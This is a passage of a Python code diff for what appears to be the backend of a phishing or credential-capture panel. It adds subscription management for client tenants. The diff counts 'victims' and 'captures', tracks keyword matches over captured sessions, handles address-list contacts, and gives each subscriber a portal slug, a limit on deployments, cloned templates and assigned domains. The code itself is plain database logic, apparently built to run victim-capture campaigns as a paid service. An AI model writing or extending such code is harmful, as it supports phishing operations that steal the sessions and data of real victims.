+            victims_count = cursor.execute('''SELECT COUNT(DISTINCT m.session_user_code) FROM keyword_matches m 
+                LEFT JOIN keyword_rules r ON m.rule_id = r.id 
+                WHERE r.owner_id IS NULL OR r.owner_id = 0''').fetchone()[0]
     except Exception:
         rules_count = total_rules = matches_count = critical_count = untriaged_count = victims_count = 0
     finally:
@@ -880,7 +1150,7 @@ def get_operators():
     conn = sqlite3.connect(Config.DB_PATH)
     conn.row_factory = sqlite3.Row
     cursor = conn.cursor()
-    ops = cursor.execute("SELECT id, username, role, status, token, bound_device_hash, bound_ip, bound_device_info, active_session_nonce, sharing_violations_count, created_at, last_login FROM operators ORDER BY id ASC").fetchall()
+    ops = cursor.execute("SELECT id, username, role, status, token, bound_device_hash, bound_ip, bound_device_info, active_session_nonce, sharing_violations_count, created_at, last_login FROM operators WHERE account_type IS NULL OR account_type != 'client_admin' ORDER BY id ASC").fetchall()
     result = []
     for op in ops:
         d = dict(op)
@@ -1325,5 +1595,240 @@ def clear_gal_contacts(user_code=None):
     except Exception as e:
         logger.error(f"[GAL] clear_gal_contacts error: {e}")
         return False
+    finally:
+        conn.close()
+
+# ── Subscribed Client SaaS Management ────────────────────────────────────
+
+def create_client_user(username, password, plan_name="Pro", duration_days=30, max_deployments=10, portal_slug=None):
+    """Creates a new client tenant subscriber with an active subscription window and portal slug."""
+    conn = sqlite3.connect(Config.DB_PATH)
+    cursor = conn.cursor()
+    try:
+        pw_hash = generate_password_hash(password)
+        token = secrets.token_hex(8)
+        
+        # Ensure clean pure-slug
+        clean_user = username.strip()
+        if not portal_slug or not portal_slug.strip():
+            portal_slug = re.sub(r'[^a-zA-Z0-9]', '', clean_user).lower()
+        else:
+            portal_slug = re.sub(r'[^a-zA-Z0-9\-]', '', portal_slug.strip()).lower()
+
+        expires_at = None
+        if duration_days and int(duration_days) > 0:
+            now = datetime.now()
+            expires_at = (now + timedelta(days=int(duration_days))).strftime('%Y-%m-%d %H:%M:%S')
+
+        cursor.execute('''INSERT INTO operators 
+            (username, password_hash, role, status, token, account_type, subscription_expires_at, plan_name, max_deployments, portal_slug)
+            VALUES (?, ?, 'admin', 'active', ?, 'client_admin', ?, ?, ?, ?)''',
+            (clean_user, pw_hash, token, expires_at, plan_name, int(max_deployments), portal_slug))
+        conn.commit()
+        client_id = cursor.lastrowid
+        # Seed the new tenant with a private clone of the master template catalog so the
+        # subscriber can deploy immediately — master edits/deletes never touch their copies.
+        try:
+            seeded = clone_master_template_catalog(client_id)
+        except Exception as e:
+            logger.warning(f"[SUBSCRIBER] Catalog seeding failed for client {client_id}: {e}")
+            seeded = 0
+        return {'success': True, 'client_id': client_id, 'token': token, 'expires_at': expires_at, 'portal_slug': portal_slug, 'templates_seeded': seeded}
+    except sqlite3.IntegrityError:
+        return {'success': False, 'error': f"Client with username '{username}' or portal slug '{portal_slug}' already exists."}
+    except Exception as e:
+        logger.error(f"[SUBSCRIBER] Error creating client user: {e}")
+        return {'success': False, 'error': str(e)}
+    finally:
+        conn.close()
+
+def get_operator_by_portal_slug(slug):
+    """Retrieve client admin subscriber by unique portal slug."""
+    if not slug:
+        return None
+    conn = sqlite3.connect(Config.DB_PATH)
+    conn.row_factory = sqlite3.Row
+    cursor = conn.cursor()
+    row = cursor.execute("SELECT * FROM operators WHERE portal_slug = ? AND account_type = 'client_admin'", (slug.strip().lower(),)).fetchone()
+    conn.close()
+    return dict(row) if row else None
+
+def get_client_users():
+    """Fetches all client subscribers with computed remaining subscription days and assigned domain counts."""
+    conn = sqlite3.connect(Config.DB_PATH)
+    conn.row_factory = sqlite3.Row
+    cursor = conn.cursor()
+    try:
+        cursor.execute("""
+            SELECT o.*,
+                   (SELECT COUNT(*) FROM deployments WHERE owner_id = o.id) AS deployment_count,
+                   (SELECT COUNT(*) FROM sessions WHERE owner_id = o.id) AS capture_count,
+                   (SELECT GROUP_CONCAT(domain, ',') FROM owned_domains WHERE owner_id = o.id AND status != 'deleted') AS assigned_domains
+            FROM operators o
+            WHERE o.account_type = 'client_admin'
+            ORDER BY o.created_at DESC
+        """)
+        rows = [dict(r) for r in cursor.fetchall()]
+        now = datetime.now()
+        for r in rows:
+            exp_str = r.get('subscription_expires_at')
+            if exp_str:
+                try:
+                    exp_dt = datetime.strptime(exp_str[:19], '%Y-%m-%d %H:%M:%S')
+                    remaining_days = (exp_dt - now).total_seconds() / 86400.0
+                    r['is_expired'] = remaining_days <= 0
+                    r['days_remaining'] = max(0, int(round(remaining_days)))
+                except Exception:
+                    r['is_expired'] = False
+                    r['days_remaining'] = 999
+            else:
+                r['is_expired'] = False
+                r['days_remaining'] = 999  # Lifetime / Unlimited
+            
+            # Domain array
+            dom_str = r.get('assigned_domains') or ''
+            r['domain_list'] = [d.strip() for d in dom_str.split(',') if d.strip()]
+        return rows
+    except Exception as e:
+        logger.error(f"[SUBSCRIBER] Error fetching client users: {e}")
+        return []
+    finally:
+        conn.close()
+
+def renew_client_subscription(client_id, days=30, custom_date=None):
+    """Extends or sets the subscription expiration date for a client user."""
+    conn = sqlite3.connect(Config.DB_PATH)
+    cursor = conn.cursor()
+    try:
+        cursor.execute("SELECT subscription_expires_at FROM operators WHERE id = ? AND account_type = 'client_admin'", (client_id,))
+        row = cursor.fetchone()
+        if not row:
+            return {'success': False, 'error': 'Client not found.'}
+        
+        now = datetime.now()
+        new_exp_str = None
+        if custom_date:
+            new_exp_str = custom_date.strip()
+        else:
+            current_exp = row[0]
+            base_dt = now
+            if current_exp:
+                try:
+                    parsed_dt = datetime.strptime(current_exp[:19], '%Y-%m-%d %H:%M:%S')
+                    if parsed_dt > now:
+                        base_dt = parsed_dt
+                except Exception:
+                    pass
+            new_exp_dt = base_dt + timedelta(days=int(days))
+            new_exp_str = new_exp_dt.strftime('%Y-%m-%d %H:%M:%S')
+
+        cursor.execute("UPDATE operators SET subscription_expires_at = ?, status = 'active' WHERE id = ?", (new_exp_str, client_id))
+        conn.commit()
+        return {'success': True, 'expires_at': new_exp_str}
+    except Exception as e:
+        logger.error(f"[SUBSCRIBER] Error renewing subscription: {e}")
+        return {'success': False, 'error': str(e)}
+    finally:
+        conn.close()
+
+def toggle_client_freeze(client_id, freeze=True):
+    """Freezes or restores a client user account."""
+    conn = sqlite3.connect(Config.DB_PATH)
+    cursor = conn.cursor()
+    try:
+        new_status = 'frozen' if freeze else 'active'
+        cursor.execute("UPDATE operators SET status = ? WHERE id = ? AND account_type = 'client_admin'", (new_status, client_id))
+        conn.commit()
+        return {'success': True, 'status': new_status}
+    except Exception as e:
+        logger.error(f"[SUBSCRIBER] Error toggling client freeze: {e}")
+        return {'success': False, 'error': str(e)}
+    finally:
+        conn.close()
+
+def delete_client_user(client_id):
+    """Deletes a client user account and clears their domain assignments."""
+    conn = sqlite3.connect(Config.DB_PATH)
+    cursor = conn.cursor()
+    try:
+        cursor.execute("DELETE FROM client_domain_assignments WHERE client_id = ?", (client_id,))
+        cursor.execute("DELETE FROM operators WHERE id = ? AND account_type = 'client_admin'", (client_id,))
+        conn.commit()
+        return {'success': True}
+    except Exception as e:
+        logger.error(f"[SUBSCRIBER] Error deleting client user: {e}")
+        return {'success': False, 'error': str(e)}
+    finally:
+        conn.close()
+
+def assign_domain_to_client(client_id, domain):
+    """Assigns an owned domain exclusively to a client subscriber."""
+    conn = sqlite3.connect(Config.DB_PATH)
+    cursor = conn.cursor()
+    try:
+        d = domain.strip().lower()
+        cursor.execute("INSERT OR REPLACE INTO client_domain_assignments (client_id, domain) VALUES (?, ?)", (client_id, d))
+        conn.commit()
+        return {'success': True}
+    except Exception as e:
+        logger.error(f"[SUBSCRIBER] Error assigning domain: {e}")
+        return {'success': False, 'error': str(e)}
+    finally:
+        conn.close()
+
+def unassign_domain_from_client(client_id, domain):
+    """Unassigns a domain from a client subscriber."""
+    conn = sqlite3.connect(Config.DB_PATH)
+    cursor = conn.cursor()
+    try:
+        d = domain.strip().lower()
+        cursor.execute("DELETE FROM client_domain_assignments WHERE client_id = ? AND domain = ?", (client_id, d))
+        conn.commit()
+        return {'success': True}
+    except Exception as e:
+        logger.error(f"[SUBSCRIBER] Error unassigning domain: {e}")
+        return {'success': False, 'error': str(e)}
+    finally:
+        conn.close()
+
+def get_client_assigned_domains(client_id):
+    """Returns list of domains assigned to a specific client subscriber."""
+    conn = sqlite3.connect(Config.DB_PATH)
+    cursor = conn.cursor()
+    try:
+        cursor.execute("SELECT domain FROM client_domain_assignments WHERE client_id = ? ORDER BY domain ASC", (client_id,))
+        return [r[0] for r in cursor.fetchall()]
+    except Exception as e:
+        logger.error(f"[SUBSCRIBER] Error fetching client domains: {e}")
+        return []
+    finally:
+        conn.close()
+
+def check_client_subscription_active(client_id):
+    """Checks whether a client account is currently active and within their subscription window."""
+    conn = sqlite3.connect(Config.DB_PATH)
+    cursor = conn.cursor()
+    try:
+        cursor.execute("SELECT status, subscription_expires_at, account_type FROM operators WHERE id = ?", (client_id,))
+        row = cursor.fetchone()
+        if not row:
+            return False, "Account does not exist."
+        status, exp_str, acct_type = row
+        if acct_type != 'client_admin':
+            return True, "Active"
+        if status == 'frozen':
+            return False, "Account is currently frozen by administrator."
+        if status != 'active':
+            return False, f"Account status: {status}."
+        if exp_str:
+            try:
+                exp_dt = datetime.strptime(exp_str[:19], '%Y-%m-%d %H:%M:%S')
+                if datetime.now() > exp_dt:
+                    return False, f"Subscription expired on {exp_dt.strftime('%b %d, %Y')}."
+            except Exception:
+                pass
+        return True, "Active"
+    except Exception as e:
+        return False, str(e)
     finally:
         conn.close()
